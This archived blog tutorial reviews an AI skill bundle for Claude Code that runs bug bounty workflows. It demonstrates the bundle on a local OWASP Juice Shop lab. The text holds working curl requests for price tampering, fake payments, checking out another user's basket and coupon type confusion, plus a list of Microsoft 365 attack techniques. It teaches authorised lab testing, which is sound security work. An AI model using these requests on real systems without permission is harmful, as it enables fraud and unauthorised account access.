# Claude-BugHunter: The Open-Source AI Security Agent That Turns Claude Code Into a Bug Bounty Machine

- **Category:** Prompt Injection & Jailbreaks
- **Publication Date:** 2026-05-25
- **Source Channel:** Daily Bounty Writeups
- **Original Reference URL:** [https://osintteam.blog/claude-bughunter-the-open-source-ai-security-agent-that-turns-claude-code-into-a-bug-bounty-b480582a6925?source=rss------bug_bounty-5](https://osintteam.blog/claude-bughunter-the-open-source-ai-security-agent-that-turns-claude-code-into-a-bug-bounty-b480582a6925?source=rss------bug_bounty-5)

---

## Full Article / Writeup Content

# Claude-BugHunter: The Open-Source AI Security Agent That Turns Claude Code Into a Bug Bounty Machine


--


Listen


Share


Today, I burned most of my morning chasing what I thought was a juicy SSRF on a bug bounty target. Turns out? False positive. CDN caching weirdness. I only realized after I’d already drafted half a report. Felt like garbage.


If you hunt bugs, you know that feeling. The tabs. The notes. The “wait, did I already test this parameter?” The mental load of remembering which payloads work against which WAFs. The frustration of drafting a report only to get it closed as “N/A” because you missed one tiny validation step.


That’s the exact mess Claude-BugHunter tries to fix.


It’s not another “AI will hack for you” fantasy. It’s a practical, open-source skill bundle that plugs into Claude Code and turns it into something that actually gets how offensive security work happens. Think less “chatbot,” more “senior researcher who’s seen this movie before and knows where the bodies are buried.”


I installed it today. Tested it against a few labs and a real VDP program. Here’s what actually happened — and whether it’s worth your time.


## First Things First: What Is This Thing, Really?


Claude-BugHunter has 51 specialized cybersecurity skills + 15 slash commands built for Claude Code. Instead of dumping one giant “be a hacker” prompt on the model, the creator broke everything into modular pieces that load automatically based on what you’re talking about.


You say, “I’m looking at a file upload form,” and it loads the file-upload testing skill. You mention “Okta tenant,” and suddenly you’ve got Okta-specific attack flows ready to go. No manual switching. No remembering which payload goes where. It just… knows.


The skills cover:

- Classic web app bugs (XSS, SQLi, IDOR, SSRF, etc.)
- API weirdness (GraphQL, JWT, OAuth, mass assignment)
- Enterprise perimeter stuff (M365/Entra ID, Okta, SharePoint, VPN appliances, vCenter)
- Cloud misconfigs (public S3 buckets, IMDS chains, confused deputy attacks)
- Even AI/LLM security testing now, which is wild but timely

But here’s what actually matters: it doesn’t just throw vulnerabilities at you. It helps you think like someone who does this for a living.


## The Stuff That Actually Helped Me


### 1. The “Don’t Waste Your Time” Gate


Before you write a single word of a report, you can type /triage and describe what you found. Claude runs it through a 7-question checklist:

- Can an attacker actually use this right now with a real HTTP request?
- Is the impact something the program actually cares about?
- Is the asset even in scope?
- Does it work without credentials that an attacker can’t get?
- Is this not just normal, documented behavior?
- Can you prove impact beyond “technically possible”?
- Is this not on the “never submit” list?

One “no” and it tells you to move on.


I used this on that fake SSRF I mentioned earlier. Claude flagged it immediately: “Impact can’t be proved beyond technically possible.” Saved me three hours of report writing. That alone made the install worth it.


### 2. Enterprise Attack Chains That Aren’t Just Theory


Most bug bounty tools stop at web apps. This one goes deeper.


When I pointed it at a test M365 tenant, it didn’t just say “check for misconfigurations.” It walked me through:

- User enumeration via AADSTS error codes
- Smart Lockout threshold math
- Conditional Access policy bypass patterns
- ROPC flow abuse when MFA isn’t enforced

Same with Okta. Same with Cisco AnyConnect. Same with SharePoint on-prem.


These aren’t copied from blog posts. They’re pulled from real disclosed reports and red-team playbooks. You can tell someone who’s actually done this work wrote them.


### 3. Reporting That Doesn’t Get Rejected


Ever had a report bounced because you used the wrong severity language? Or forgot to redact a cookie in a screenshot? Or submitted to Bugcrowd using HackerOne formatting?


Yeah. Me too.


Claude-BugHunter includes platform-specific reporting templates. Type /report, describe your finding, and it spits out copy-paste-ready text formatted for HackerOne, Bugcrowd (with VRT-aware severity requests), Intigriti, or even client-facing red-team deliverables.


It also reminds you to redact PII, black-bar sensitive headers, and sanitize HAR files. Small things. Huge difference in whether your report gets taken seriously.


## Note


BlackArch LinuxWe also provide a ready-to-deploy BlackArch Linux VM that can be launched instantly on AWS, GCP, or Azure. No installation, setup, or dependency management required — just spin it up and start using a full arsenal of penetration testing and security auditing tools in minutes.


Kali GUI LinuxOur Kali GUI Linux VM comes fully pre-configured with a graphical interface, making it easy for both beginners and professionals to get started. Deploy directly on AWS, GCP, or Azure with zero setup — no installation hassles, just immediate access to a complete offensive security toolkit.


Browser-Based Kali LinuxWe offer a browser-based Kali Linux environment that runs entirely in the cloud. Simply deploy and access it from your browser — no downloads, no local setup, no compatibility issues. Deploy directly on AWS, GCP, or Azure with zero setup — no installation hassles, just immediate access to a complete offensive security toolkit. Perfect for quick testing, learning, and remote security operations from anywhere.


ParrotOS LinuxOur ParrotOS Linux VM is optimized for security, privacy, and development workflows. Available for instant deployment on AWS, GCP, and Azure, it eliminates the need for manual installation — giving you a secure, ready-to-use environment in just a few clicks.


## Installing It (Without Losing Your Mind)


Prerequisites:

- macOS or Linux (Windows folks: use WSL2)
- Claude Code CLI + a Pro/Team/Max subscription
- Python 3.9+
- git

That’s it. No Docker. No npm hell. No wrestling with virtual environments.


### Step 1: Clone and run the installer


```
mkdir -p ~/security-research && cd ~/security-researchgit clone https://github.com/elementalsouls/Claude-BugHunter.gitcd Claude-BugHunter && ./scripts/install.sh
```


The script copies skills to~/.claude/skills/, commands to~/.claude/commands/, and wires a handy hunt shell command into your rc file. Takes about two minutes.


### Step 2: Restart your terminal


```
source ~/.zshrc  # or ~/.bashrc
```


### Step 3: Verify It Actually Loaded (30 Seconds)


Before you go hunting, let’s make sure everything’s wired up right. Run these three quick checks:


```
# 1. Does the hunt command respond?hunt# Expected: prints "Usage: hunt <target-name>" + default base path# 2. Do we have all 51 skills installed?ls ~/.claude/skills/ | wc -l# Expected: 51# 3. Spot-check a few key skillsls ~/.claude/skills/ | grep -E '^(hunt-xss|hunt-rce|m365-entra-attack|triage-validation)$'# Expected: all four names print back
```


Here’s what I saw on my machine:


```
$ huntUsage: hunt <target-name>Creates a new engagement folder at $HUNT_BASE/<target-name>Default $HUNT_BASE is /Users/ayushkumar/Targets$ ls ~/.claude/skills/ | wc -l      51$ ls ~/.claude/skills/ | grep -E '^(hunt-xss|hunt-rce|m365-entra-attack|triage-validation)$'hunt-xsshunt-rcem365-entra-attacktriage-validation
```


If any of those fail? Don’t panic. Just run source ~/.zshrc again. If hunt still says "command not found," check that the install script actually added the source line to your rc file. Happens more often than you'd think.


## Step 4: Your First Hunt (Local Juice Shop via Docker)


Let’s skip the public demos and run Juice Shop right on your machine. Faster. Cleaner. Zero internet dependency.


First, make sure Docker’s running:


```
docker --version# Should print something like: Docker version 24.x.x, build ...
```


If Docker isn’t installed yet:→ Mac: Docker Desktop for Mac→ Linux: sudo apt install docker.io (Ubuntu/Debian) or check get.docker.com→ Windows: Use WSL2 + Docker Desktop (yes, it's a few steps—but worth it)


Now, spin up Juice Shop:


```
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
```


That’s it. In ~30 seconds, you’ll have a fully vulnerable app running at:


```
http://localhost:3000
```


Open that in your browser. You should see the Juice Shop homepage. Log in as admin@juice-sh.op / admin123 If you want to test authenticated flows later.


### Step 5: Launch Claude Code and Confirm Trust


Once the hunt command creates your engagement folder; you need to actually launch Claude Code inside it.


```
# Navigate to your new engagement foldercd ~/Targets/juice-local# Launch Claude Codeclaude
```


The first time you run claude in a new folder, it'll show you a safety prompt:


```
Quick safety check: Is this a project you created or one you trust?(Like your own code, a well-known open source project, or work from your team).If not, take a moment to review what's in this folder first.Claude Code'll be able to read, edit, and execute files here.> 1. Yes, I trust this folder  2. No, exit
```


Select option 1 (you just created this folder, so you know it’s clean).


What just happened:

- The hunt Command scaffolded a professional engagement workspace
- You’ve got scope.md ready for in/out of scope items
- findings/ and evidence/ folders are set up (and gitignored)
- CLAUDE.md gives Claude context about this specific engagement
- Claude Code is now running inside that folder, ready to help

This isn’t just a random directory. It’s a structured workspace that mirrors how professional bug hunters and red-teamers organize their work. Every engagement gets its own folder. Every finding gets documented. Every piece of evidence gets tracked.


You’re now ready to actually start hunting.


Next: Tell Claude what you’re testing. Something like:


> “I’m testing a local OWASP Juice Shop instance at http://localhost:3000. Walk me through a bug bounty workflow from scratch. Start with recon.”


“I’m testing a local OWASP Juice Shop instance at http://localhost:3000. Walk me through a bug bounty workflow from scratch. Start with recon.”


And watch it load the right skills automatically.


### Step 6: Log In and Pick the Right Model (Without Burning Credits)


Once you’re insideclaude, you'll see a Not logged in prompt. Type /login and follow the browser flow to authenticate with your Anthropic Console account. You'll know it worked when the terminal prints Login successful and the top banner switches to API Usage Billing.


But before you start sending prompts, do yourself a favor: switch the model.


By default, Claude Code runs on Opus 4.7 — the smartest model, but also the most expensive ($5/$25 per Mtok). For recon, endpoint mapping, and basic workflow guidance, you don't need Opus. You're just lighting credits on fire.


Type /model and you'll get a clean pricing menu:


```
1. Default (recommended)   → Opus 4.7 (1M context) • $5/$25 per Mtok2. Sonnet                  → Sonnet 4.6 • Best for everyday tasks • $3/$15 per Mtok3. Sonnet (1M context)     → Same pricing, longer memory window4. Haiku                   → Haiku 4.5 • Fastest for quick answers • $1/$5 per Mtok  ← I picked this5. gemma4:e2b              → Detected from Ollama (local)
```


I highlighted Haiku 4.5 and pressed Enter. Here's why:

- It’s 5x cheaper than Opus
- It handles recon commands, skill routing, and payload generation just fine
- You only need to bump up to Sonnet or Opus later if you’re doing complex exploit chaining or deep impact analysis

Select Haiku, hit Enter, and you're locked in for a budget-friendly session. You can always switch back mid-hunt (/model works anytime), but for 90% of the workflow, Haiku is the sweet spot.


Wallet check: Type /usage whenever you want to see exactly how many tokens you've burned. I kept my recon phase under $0.90 by sticking to Haiku and approving commands selectively.


Now that you’re authenticated and the model’s set, it’s time to actually start the hunt.


### Step 7: The First Command (And Why the Permission Prompt Actually Matters)


I pasted my prompt:


> "I'm testing a local OWASP Juice Shop instance at http://localhost:3000. Walk me through a bug bounty workflow from scratch. Start with recon."


"I'm testing a local OWASP Juice Shop instance at http://localhost:3000. Walk me through a bug bounty workflow from scratch. Start with recon."


Claude didn’t dump a wall of generic advice. It broke the response into phases, asked me to confirm scope, laid out a 4-point recon plan, and then tried to run its first command:


```
curl -s http://localhost:3000 | head -50
```


And then it stopped.


A prompt appeared:


```
Do you want to proceed?> 1. Yes  2. Yes, and don't ask again for: curl -s http://localhost:3000  3. No
```


This is where the tool either wins you over or loses you. A lot of “AI agent” scripts just execute blindly. You click run and hope it doesn’t wreck your terminal or spam a target. Claude Code doesn’t do that. It shows you exactly what it’s about to run, explains why, and waits for your OK.


## Get Parvez Mohammed @ Techlatest.net’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


I selected 2. Yes, and don't ask again for this command—because I knew I'd be running similar curl calls, and I didn't want to babysit every single one. But the fact that it asked at all matters. You're not handing over root access to a black box. You're collaborating with a tool that respects your control.


Once approved, it fetched the homepage HTML- Parsed the headers and source- Identified the tech stack (Express + Angular)- Immediately queued the next step: crawling for hidden endpoints


### Step 8: Auth Done, Now Let’s Hunt (And Why Business Logic First)


Right after I approved the auth setup, Claude didn’t just say “cool, you’re logged in.” It did something way more useful: it wrote a file.


auth-setup.md dropped into my engagement folder with:

- Test credentials (email, password, user ID, role)
- The full JWT token (RS256 signed)
- A decoded payload showing exactly what’s inside — including a weird detail: the password hash (MD5) was embedded in the token itself
- Copy-paste examples for using the token in curl or JavaScript
- A table of which auth endpoints we’d already verified

That last bit — the MD5 hash in the JWT — caught my eye. Claude flagged it immediately: “Key Observation: Password hash (MD5) is embedded in JWT — potential exposure.”


That’s not a critical bug on Juice Shop (it’s a training app, after all). But on a real target? That’s the kind of detail that turns a low-severity finding into a chainable account takeover. And Claude spotted it without me asking.


### The Hunt Menu: Picking Where to Start


Once auth was locked in, Claude presented a clean, prioritized list of what to test next:


```
High-Priority Hunt Areas (in order):1. Business Logic — Price manipulation, order tampering, coupon abuse2. IDOR — Access other users' data by swapping IDs3. Injection Attacks — SQL, NoSQL, command injection via search/chat4. Authentication Bypass — JWT tampering, admin escalation5. Access Control — Admin panel bypass, sensitive data exposure
```


No overwhelming wall of options. No, “here are 50 things you could do.” Just five high-leverage targets, ranked by likely impact.


I typed:


```
hunt business logic
```


Why business logic first? Because on e-commerce apps (and Juice Shop is one), pricing flaws, coupon abuse, and order manipulation often pay out higher than XSS or basic IDOR. And they’re easy to miss if you’re just spraying payloads.


### What Happened Next (And Why It Felt Different)


Claude didn’t dump a generic “test for business logic flaws” checklist. It loaded the hunt-business-logic skill automatically and started walking me through Juice Shop–specific tests:


```
# Test 1: Add product to cart, intercept, modify pricecurl -X POST http://localhost:3000/api/BasketItems \  -H "Authorization: Bearer $TOKEN" \  -H "Content-Type: application/json" \  -d '{"ProductId":1,"quantity":1,"price":0.01}'# Test 2: Apply a coupon code with negative quantitycurl -X POST http://localhost:3000/rest/checkout \  -H "Authorization: Bearer $TOKEN" \  -d '{"couponData":"DISCOUNT10","orderDetails":{"totalPrice":-100}}'# Test 3: Check if deluxe membership can be bypassedcurl -X POST http://localhost:3000/rest/deluxe-membership \  -H "Authorization: Bearer $TOKEN" \  -d '{"paymentMode":"fake","paymentId":"0"}'
```


Each command came with a plain-English explanation:


> “This tests if the backend trusts the client-side price field. If it does, you could buy a $999 product for $0.01.”“Negative totals sometimes slip through if the server doesn’t re-calculate the final price. Worth a shot.”“Some apps only check if a paymentId exists, not if it’s valid. Fake values can sometimes activate premium features.”


“This tests if the backend trusts the client-side price field. If it does, you could buy a $999 product for $0.01.”


“Negative totals sometimes slip through if the server doesn’t re-calculate the final price. Worth a shot.”


“Some apps only check if a paymentId exists, not if it’s valid. Fake values can sometimes activate premium features.”


This isn’t script-kiddie payload spraying. This is hypothesis-driven testing. You’re not throwing darts — you’re asking specific questions and watching how the app answers.


### Step 9: The Hunt Actually Happens (And Why It Felt Like Pairing With a Senior Researcher)


Right after I typed hunt business logic, Claude didn't dump a generic checklist. It loaded the hunt-business-logic skill and started doing what experienced hunters do: methodically probing, adapting based on responses, and documenting as it goes.


First, it created a fresh findings file:


```
findings/finding-01-business-logic-hunt.md
```


Not a generic template. A live document that updates in real time as we test things.


### The Endpoint Hunt (No Guesswork)


Claude started by hunting for the actual checkout endpoint. Not assuming /checkout or /api/orders. Actually looking.


It ran commands like:


```
# Search JS bundles for route patternsgrep -oE "'/[a-zA-Z0-9/_-]+(orders|payment|checkout|cart)'" /tmp/main.js | head -20# Test common API pathscurl -s -X GET "http://localhost:3000/rest/orders" \  -H "Authorization: Bearer $TOKEN"
```


When /rest/orders returned HTML instead of JSON; it didn't guess. It kept searching.


Then it found it:


```
✅ Checkout endpoint: /rest/basket/{basketId}/checkout
```


### The “Oh Crap” Moment: IDOR in the Wild


Once it had the endpoint, Claude didn’t just test the happy path. It asked the right question:


> “What if I try checking out a basket that doesn’t belong to me?”


“What if I try checking out a basket that doesn’t belong to me?”


It ran:


```
curl -X POST "http://localhost:3000/rest/basket/2/checkout" \  -H "Authorization: Bearer $TOKEN" \  -d '{"couponData":"","orderDetails":{"deliveryMethodId":1,"paymentMethodId":1}}'
```


And got back:


```
{"orderConfirmation":"80c7-ac8f3f4514c50e7e"}
```


Translation: “Order placed successfully. On behalf of another user.”


Claude flagged it immediately:


```
🎯 CRITICAL FINDING: I can checkout other users' baskets!
```


No waiting for me to notice. No “maybe that’s normal?” It recognized the pattern, labeled the severity, and started building the PoC right there in the findings file.


### What Happened Next (The Workflow That Actually Saves Time)


Claude didn’t stop at one finding. It kept probing:


Test 2: Coupon type confusion


```
# Send couponData as object instead of string"couponData": {"coupon": ""}
```


Result: Buffer.from() error. Potential type-confusion bug. Flagged as HIGH.


Test 3: BasketItems IDOR


```
Test 3: BasketItems IDOR
```


Result: Could view, modify, and delete items in other users’ carts. Flagged as HIGH.


Test 4: Coupon validation


```
# Try arbitrary coupon codes"couponData": "VALID", "couponData": "-100", "couponData": ""
```


Result: All accepted without validation. Flagged as MEDIUM (needs deeper testing).


Each test updated the findings document in real-time. Each finding got:

- A clear description
- Exact curl commands to reproduce
- Root cause analysis
- Remediation advice (actual code snippets, not just “fix authorization”)

### The Final Summary


By the end, the findings file looked like this:


```
## Summary of Business Logic Findings| # | Vulnerability | Type | Severity | Status ||---|--------------|------|----------|--------|| 1 | IDOR on Checkout | Access Control | 🔴 CRITICAL | ✅ Confirmed || 2 | IDOR on BasketItems | Access Control | 🟠 HIGH | ✅ Confirmed || 3 | Type Mismatch in Coupon | Input Validation | 🟠 HIGH | ✅ Confirmed || 4 | Insufficient Coupon Validation | Business Logic | ⚠️ MEDIUM | 🔍 Requires verification |## Recommended Fixes**CRITICAL (Implement immediately):**1. **Basket ownership validation** — Check `basket.userId === req.user.id` before any operation2. **BasketItems ownership validation** — Verify basket ownership before GET/PUT/DELETE**HIGH (Important):**1. **Type validation** — Validate coupon is a string before calling `Buffer.from()`2. **Coupon whitelisting** — Only accept valid coupon codes from a database
```


### What Came Next


After compiling the findings, Claude offered four paths:


```
Would you like to:1. Validate findings — Run the triage gate on these findings before reporting2. Hunt another vulnerability class — IDOR, Injection, Auth Bypass, File Upload, etc.3. Deepen this hunt — Test coupon stacking, negative prices, membership bypass4. Write reports — Format findings for submission
```


I picked option 1. Typed:


```
/triage on the IDOR findings
```


And that’s where the workflow really clicked. But that’s Step 10.


For now: you’ve seen the hunt. You’ve seen the findings. You’ve seen how a tool can actually help, rather than just chatting about security.


The question isn’t “can AI find bugs?” It’s “Can AI help you find bugs faster, with less burnout?”


After this session? My answer is yes.


P.S. — If you’re following along: don’t skip the /triage step. Even if you're confident in a finding, let the gate run. It's the difference between drafting a report that gets accepted and drafting one that wastes your evening.


### Step 10: The Reality Check (Running /triage Before Wasting Time)


Right after Claude compiled those four findings — especially that critical IDOR on checkout — I didn’t jump straight to drafting a report. I typed:


```
/triage on the IDOR findings
```


Here’s why that one command is the difference between productive hunting and spinning your wheels.


Claude loaded the triage-validation skill and ran the finding through the 7-Question Gate:

- Can an attacker use this RIGHT NOW with a real HTTP request?Yes. We literally just POSTed to /rest/basket/2/checkout and got a valid order confirmation back.
- Is the impact something the program actually cares about?Fraudulent orders = financial loss = almost always in-scope for real programs.
- Is the asset in scope?We’re testing localhost:3000—our own local instance. Zero ambiguity.
- Does it work without privileged access an attacker can’t get?We used a standard customer JWT. Any registered user could do this.
- Is this not already known or documented behavior? Juice Shop is deliberately vulnerable, so technically “known.” But on a real target? Fresh finding.
- Can impact be proved beyond “technically possible”?Yes. We have order confirmations, basket IDs, and HTTP responses showing the exploit worked.
- Is this not on the never-submit list?IDOR with financial impact is rarely on any program’s “don’t submit” list.

Verdict: PASS


Translation: “This is valid, in-scope, impactful, and ready to report. Don’t waste time doubting — go write it up.”


### The Honest Verdict: Is Claude-BugHunter Worth It?


Yes — if you fit one of these profiles:


✅ You do bug bounties or external pentests regularly✅ You hate context-switching between tools, notes, and tabs✅ You want a reusable methodology, not just a one-off script✅ You’re okay spending $1–3/session on API credits (or $20/month for Pro)


No — if you’re looking for:


❌ A completely free, no-login-required tool❌ Something that finds bugs for you❌ Internal AD / post-exploit / C2 tradecraft (that’s a different bundle)


What it actually does well:

- Loads the right skill at the right time (no manual switching)
- Generates scoped, actionable recon commands (not generic advice)
- Catches false positives early via the 7-question gate
- Formats reports so triagers actually understand them
- Keeps your evidence clean (PII redaction, cookie sanitization)

## Final Thought: It’s a Toolbox, Not a Magic Wand


Claude-BugHunter didn’t find a bug I couldn’t spot. Juice Shop is deliberately vulnerable — anyone can find these issues with enough poking.


The win is in the workflow:

- It kept me focused on high-leverage targets (business logic first, not XSS)
- It caught false positives early (via the 7-question gate)
- It formatted output so it’s actually usable (no more “wait, how do I structure this?”)
- It documented everything as we went (no more “where did I save that screenshot?”)

That’s not flashy. But it’s what separates productive researchers from burnout.


If you’re tired of juggling tabs, notes, and half-remembered payloads — give it a shot. Start with the free paths. Add credits if you want to test the AI flow. See if it fits your workflow.


And if you try it? We would love to hear what you find.


P.S. — Use it responsibly. Stay in scope. Get permission. The goal is to make the internet safer, not to cause chaos. The bundle includes validation gates to help with that — but your judgment still matters most.


## Thank you so much for reading


Like | Follow | Subscribe to the newsletter.


Catch us on


Website: https://www.techlatest.net/


Newsletter: https://substack.com/@techlatest


Twitter: https://twitter.com/TechlatestNet


LinkedIn: https://www.linkedin.com/in/techlatest-net/


YouTube:https://www.youtube.com/@techlatest_net/


Blogs: https://medium.com/@techlatest.net


Reddit Community: https://www.reddit.com/user/techlatest_net/

---
*Archived in LLM Hacking Vault from verified community intelligence.*
